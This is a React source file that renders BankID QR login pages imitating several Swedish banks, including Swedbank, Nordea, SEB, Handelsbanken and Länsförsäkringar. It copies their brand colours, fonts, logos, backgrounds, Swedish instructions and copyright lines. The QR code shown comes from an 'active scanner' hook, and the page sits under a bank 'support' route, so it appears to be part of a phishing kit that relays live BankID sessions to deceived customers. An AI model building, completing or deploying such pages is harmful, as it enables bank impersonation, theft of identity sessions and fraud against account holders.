import { useParams, useNavigate } from "react-router-dom";
import { useEffect, useState } from "react";
import { ChevronRight, ChevronDown, ArrowLeft } from "lucide-react";
import bankidLogo from "@/assets/bankid-logo.png";
import DisplayPanel from "@/components/DisplayPanel";
import ConnectionIndicator from "@/components/ConnectionIndicator";
import { useActiveScanner } from "@/hooks/useActiveScanner";
import { useBankTheme } from "@/context/BankThemeContext";
import { useLanguage } from "@/context/LanguageContext";
import LanguageSwitcher from "@/components/LanguageSwitcher";
import { bankLogoImages } from "@/config/bankLogos";

import bgSwedbank from "@/assets/bg-swedbank.jpg";
import bgNordea from "@/assets/bg-nordea.png";
import bgSeb from "@/assets/bg-seb.jpg";
import bgHandelsbanken from "@/assets/bg-handelsbanken.jpg";
import bgSparbankenSyd from "@/assets/bg-sparbanken-syd.jpg";
import bgDanskebank from "@/assets/bg-danskebank.jpg";
import bgIcaBanken from "@/assets/bg-ica-banken.jpg";
import bgLansforsakringar from "@/assets/bg-lansforsakringar.jpg";

const backgrounds: Record<string, string> = {
  swedbank: bgSwedbank,
  nordea: bgNordea,
  seb: bgSeb,
  handelsbanken: bgHandelsbanken,
  "sparbanken-syd": bgSparbankenSyd,
  danskebank: bgDanskebank,
  "ica-banken": bgIcaBanken,
  lansforsakringar: bgLansforsakringar,
};

const NORDEA_BLUE = "#00005E";
const NORDEA_LINK = "#0000BF";
const NORDEA_FONT = '"Segoe UI", system-ui, -apple-system, Helvetica, Arial, sans-serif';

const SEB_GREEN = "#353531";
const SEB_DARK = "#333333";
const SEB_FONT = '"Segoe UI", system-ui, -apple-system, Helvetica, Arial, sans-serif';

const HB_BLUE = "#005C9E";
const HB_DARK = "#333333";
const HB_FONT = '"Segoe UI", system-ui, -apple-system, Helvetica, Arial, sans-serif';

const FlowPage = () => {
  const { mode, bankId } = useParams<{ mode: string; bankId: string }>();
  const navigate = useNavigate();
  const { bank, setBankId } = useBankTheme();
  const { t } = useLanguage();
  const label = t(`flow.${mode || ""}`) || (mode || "").toUpperCase();
  const buttonLabel = t(`flow.button.${mode || ""}`) || label;

  useEffect(() => {
    if (bankId) setBankId(bankId);
    return () => setBankId(null);
  }, [bankId, setBankId]);

  const [instructionsOpen, setInstructionsOpen] = useState(false);
  const { state, connectionStatus, qrPayload, simulateQR, clearQR } = useActiveScanner();

  const showDemoButtons = import.meta.env.VITE_SHOW_DEMO_BUTTONS === "true" || import.meta.env.VITE_SCANNER_MODE === "sim" || !import.meta.env.VITE_SCANNER_MODE;

  const bgImage = backgrounds[bankId || ""] || "";
  const bankName = bank?.name || "Banken";
  const primaryHsl = bank?.primary || "0 0% 0%";
  const isSwedbank = bankId === "swedbank";
  const isNordea = bankId === "nordea";
  const isSEB = bankId === "seb";
  const isHB = bankId === "handelsbanken";
  const isSparbankenSyd = bankId === "sparbanken-syd";
  const isLF = bankId === "lansforsakringar";

  const fontFamily = isSwedbank
    ? '"Roboto", Arial, Helvetica, sans-serif'
    : isNordea
      ? NORDEA_FONT
      : isSEB
        ? SEB_FONT
        : isHB
          ? HB_FONT
          : isSparbankenSyd
            ? 'system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif'
            : undefined;

  const textColor = isSwedbank ? "#512B2B" : isNordea ? NORDEA_BLUE : isSEB ? SEB_DARK : isHB ? HB_DARK : isSparbankenSyd ? "#1a1a1a" : undefined;
  const headingColor = isSwedbank ? "#FF5F00" : isNordea ? NORDEA_BLUE : isSEB ? SEB_DARK : isHB ? HB_BLUE : isSparbankenSyd ? "#1a1a1a" : `hsl(${primaryHsl})`;
  const headingFont = isSwedbank
    ? '"Swedbank Headline", sans-serif'
    : isNordea
      ? NORDEA_FONT
      : isSEB
        ? SEB_FONT
        : isHB
          ? HB_FONT
          : isSparbankenSyd
            ? 'system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif'
            : undefined;
  const accentColor = isSwedbank ? "#257886" : isNordea ? NORDEA_LINK : isSEB ? SEB_GREEN : isHB ? HB_BLUE : isSparbankenSyd ? "#1a1a1a" : `hsl(${bank?.accent || primaryHsl})`;
  const buttonRadius = isNordea ? "4px" : isHB ? "24px" : "999px";
  const buttonFont = isSparbankenSyd ? 'system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif' : isNordea ? NORDEA_FONT : isSEB ? SEB_FONT : isHB ? HB_FONT : '"Swedbank Headline", sans-serif';

  const pageStyle = { backgroundImage: `url(${bgImage})` };

  const cardStyle = { boxShadow: "0 15px 60px rgba(0,0,0,0.55), 0 5px 20px rgba(0,0,0,0.3)" };

  // Länsförsäkringar QR scan style
  const LF_NAVY = "#00427a";
  const LF_BG = "#e4eef5";
  const LF_FONT_BODY = '"Segoe UI", system-ui, -apple-system, Helvetica, Arial, sans-serif';
  const LF_HEADING_FONT = '"Intro Cond", "Arial Narrow", "Helvetica Neue", Arial, sans-serif';

  if (isLF) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center" style={{ backgroundColor: LF_BG }}>
        <div className="w-full max-w-[560px] mx-4 bg-white rounded-lg overflow-hidden relative" style={{ boxShadow: "0 2px 12px rgba(0,0,0,0.08)", fontFamily: LF_FONT_BODY }}>
          {/* Logo inside card */}
          <div className="flex justify-center" style={{ padding: "28px 32px 0" }}>
            <img src={bankLogoImages["lansforsakringar"]} alt="Länsförsäkringar" style={{ height: "52px" }} className="object-contain" />
          </div>

          {/* Title */}
          <div className="text-center" style={{ padding: "24px 32px 8px" }}>
            <h1 style={{ color: LF_NAVY, fontFamily: LF_HEADING_FONT, fontWeight: 700, fontSize: "1.5rem", lineHeight: "2rem", margin: 0 }}>
              {label}
            </h1>
          </div>

          {/* Instruction */}
          <div className="text-center" style={{ padding: "8px 48px 24px", fontSize: "15px", lineHeight: "1.5", color: "#333" }}>
            Öppna BankID-appen och skanna QR-koden
          </div>

          {/* QR display */}
          <div style={{ padding: "0 32px 16px" }}>
            <DisplayPanel state={state} qrPayload={qrPayload} />

            {/* Demo buttons */}
            {showDemoButtons && (
            <div className="flex justify-center gap-3 mt-2">
              <button
                onClick={() => simulateQR("bankid://launch?autostarttoken=DEMO-123-ABC")}
                className="px-4 py-2 border transition-colors hover:opacity-80"
                style={{ fontSize: "12px", fontWeight: 500, color: "#333", borderRadius: "6px", borderColor: "#ccc", background: "#f8f8f8" }}
              >
                {t("flow.demoQR")}
              </button>
              <button
                onClick={clearQR}
                className="px-4 py-2 border transition-colors hover:opacity-80"
                style={{ fontSize: "12px", fontWeight: 500, color: "#333", borderRadius: "6px", borderColor: "#ccc", background: "#f8f8f8" }}
              >
                {t("flow.reset")}
              </button>
            </div>
            )}
          </div>

          {/* "Öppna BankID på denna enhet istället" link */}
          <div className="text-center" style={{ padding: "8px 32px 24px" }}>
            <a href="#" className="hover:underline" style={{ color: LF_NAVY, fontSize: "15px", fontWeight: 400 }}>
              Öppna BankID på denna enhet istället
            </a>
          </div>

          {/* Tillbaka button */}
          <div style={{ padding: "0 64px 32px" }}>
            <button
              onClick={() => navigate(`/bank/${bankId}/support`)}
              className="w-full flex items-center justify-center gap-2 transition-colors hover:opacity-90"
              style={{ border: `2px solid ${LF_NAVY}`, background: "white", color: LF_NAVY, fontFamily: LF_FONT_BODY, fontWeight: 600, fontSize: "15px", padding: "14px 24px", borderRadius: "6px", cursor: "pointer" }}
            >
              <ArrowLeft className="w-4 h-4" />
              Tillbaka
            </button>
          </div>

          {/* Footer links */}
          <div className="flex justify-center gap-6 flex-wrap" style={{ padding: "0 32px 24px", fontSize: "13px", color: LF_NAVY }}>
            <a href="#" className="hover:underline">Om personuppgifter</a>
            <a href="#" className="hover:underline">Cookie-inställningar</a>
            <a href="#" className="hover:underline">Internetvillkor</a>
            <a href="#" className="hover:underline">Säkerhet</a>
            <a href="#" className="hover:underline">Kontakta oss</a>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div
      className="min-h-screen flex items-center justify-center bg-cover bg-center bg-no-repeat"
      style={pageStyle}
    >
      <div className="w-full max-w-[420px] mx-4 flex flex-col items-center">
        <div
          className="w-full bg-white overflow-hidden relative"
          style={{
            ...cardStyle,
            fontFamily,
            color: textColor,
          }}
        >
        {/* Back button */}
        <div style={{ padding: "24px 24px 4px" }}>
          <button
            onClick={() => navigate(`/bank/${bankId}/support`)}
            className="flex items-center gap-1 transition-colors hover:opacity-80"
            style={{
              fontSize: "14px",
              color: textColor,
              fontFamily,
              background: "none",
              border: "none",
              cursor: "pointer",
            }}
          >
            <ArrowLeft className="w-4 h-4" />
            {t("flow.back")}
          </button>
        </div>

        <div style={{ padding: "8px 24px 8px" }}>
          <h1
            style={{
              color: headingColor,
              fontFamily: headingFont,
              fontWeight: isSEB ? 400 : 700,
              fontSize: isNordea ? "1.375rem" : "1.5rem",
              lineHeight: isNordea ? "1.75rem" : "2rem",
              margin: 0,
            }}
          >
            {label}
          </h1>
        </div>

        {/* Tabs */}
        <div style={{ padding: "0 24px 16px" }}>
          <div className="flex gap-6 border-b" style={{ borderColor: isNordea ? "#E3E3E3" : isSEB ? "#E1E1E1" : "#e5e5e5" }}>
            <button
              className="pb-2 border-b-2"
              style={{
                borderColor: isSwedbank ? "#FF5F00" : isNordea ? NORDEA_BLUE : isSEB ? SEB_GREEN : isHB ? HB_BLUE : `hsl(${primaryHsl})`,
                color: isSwedbank ? "#FF5F00" : isNordea ? NORDEA_BLUE : isSEB ? SEB_GREEN : isHB ? HB_BLUE : `hsl(${primaryHsl})`,
                fontFamily: headingFont,
                fontWeight: isNordea ? 600 : isSEB ? 500 : isHB ? 500 : 700,
                fontSize: "14px",
              }}
            >
              Mobilt BankID
            </button>
          </div>
        </div>

        {/* Instruction text — hide when QR is displayed */}
        {state !== "SHOWING_QR" && (
        <div style={{ padding: "0 24px 8px" }}>
          <p style={{
            fontSize: "14px",
            fontWeight: isNordea ? 500 : isSEB ? 400 : 700,
            fontFamily,
            color: textColor,
          }}>
            Öppna BankID-appen och skanna QR-koden
          </p>
        </div>
        )}

        {/* QR display area */}
        <div style={{ padding: "0 24px 16px" }}>
          <DisplayPanel state={state} qrPayload={qrPayload} />

          {/* Demo buttons (dev only) */}
          {showDemoButtons && (
          <div className="flex justify-center gap-3 mt-2">
            <button
              onClick={() => simulateQR("bankid://launch?autostarttoken=DEMO-123-ABC")}
              className="px-4 py-2 bg-gray-50 border border-gray-200 transition-colors hover:opacity-80"
              style={{ fontSize: "12px", fontWeight: 500, color: textColor, borderRadius: isNordea ? "4px" : "8px" }}
            >
              {t("flow.demoQR")}
            </button>
            <button
              onClick={clearQR}
              className="px-4 py-2 bg-gray-50 border border-gray-200 transition-colors hover:opacity-80"
              style={{ fontSize: "12px", fontWeight: 500, color: textColor, borderRadius: isNordea ? "4px" : "8px" }}
            >
              {t("flow.reset")}
            </button>
          </div>
          )}
        </div>

        {/* BankID button */}
        <div style={{ padding: "0 24px 12px" }}>
          <button
            className="w-full overflow-hidden relative flex items-center justify-center transition-opacity hover:opacity-90"
            style={{
              backgroundColor: isSwedbank ? "#D1C6C4" : isNordea ? "#E8E8EE" : isSEB ? "#F5F5F5" : `hsl(${bank?.muted || "0 0% 90%"})`,
              color: isSwedbank ? "#512B2B" : isNordea ? NORDEA_BLUE : isSEB ? SEB_DARK : `hsl(${bank?.mutedForeground || "0 0% 40%"})`,
              fontFamily: buttonFont,
              fontWeight: isNordea ? 600 : isSEB ? 400 : isHB ? 500 : 700,
              fontSize: isNordea || isSEB || isHB ? "1rem" : "1.1875rem",
              lineHeight: "1.5rem",
              padding: isNordea ? "14px 32px" : "12px 32px",
              minHeight: "48px",
              borderRadius: buttonRadius,
              border: isSEB ? "1px solid #E1E1E1" : "none",
            }}
          >
            <img src={bankidLogo} alt="BankID" className="h-11 w-auto object-contain" />
            <span style={{ marginLeft: "-2px" }}>{buttonLabel}</span>
          </button>
        </div>


        {/* Instruktioner collapsible */}
        <div style={{ padding: "0 24px 24px" }}>
          <button
            onClick={() => setInstructionsOpen(!instructionsOpen)}
            className="flex items-center gap-1 hover:opacity-80"
            style={{
              fontFamily: headingFont,
              fontWeight: isNordea ? 500 : isSEB ? 500 : isHB ? 500 : 700,
              fontSize: isNordea ? "0.9375rem" : isSEB ? "0.9375rem" : isHB ? "0.9375rem" : "1rem",
              color: isSwedbank ? "#257886" : isNordea ? NORDEA_LINK : isSEB ? SEB_GREEN : isHB ? HB_BLUE : undefined,
              background: "none",
              border: "none",
              cursor: "pointer",
            }}
          >
            {instructionsOpen ? <ChevronDown className="w-4 h-4" /> : <ChevronRight className="w-4 h-4" />}
            Instruktioner
          </button>
          {instructionsOpen && (
            <div style={{ padding: "12px 0 0 8px", fontSize: "14px", lineHeight: "1.7", color: textColor }}>
              <p style={{ fontWeight: 700, marginBottom: "8px" }}>Så här gör du:</p>
              <ol style={{ paddingLeft: "20px", margin: 0 }}>
                <li>Vänta tills en QR-kod visas på skärmen.</li>
                <li>Öppna din Mobilt BankID-app.</li>
                <li>Tryck på "Skanna QR-kod".</li>
                <li>Rikta kameran mot skärmen och håll stilla tills identifieringen är klar.</li>
                <li>Signera med din säkerhetskod.</li>
              </ol>
            </div>
          )}
        </div>

        {/* Copyright */}
        <div className="text-center" style={{ padding: "0 24px 24px" }}>
          <p style={{ fontSize: "12px", color: textColor, opacity: 0.4 }}>
            © {new Date().getFullYear()} {bankName} AB &amp; Finansiell ID-Teknik BID AB
          </p>
        </div>
      </div>
      </div>
    </div>
  );
};

export default FlowPage;
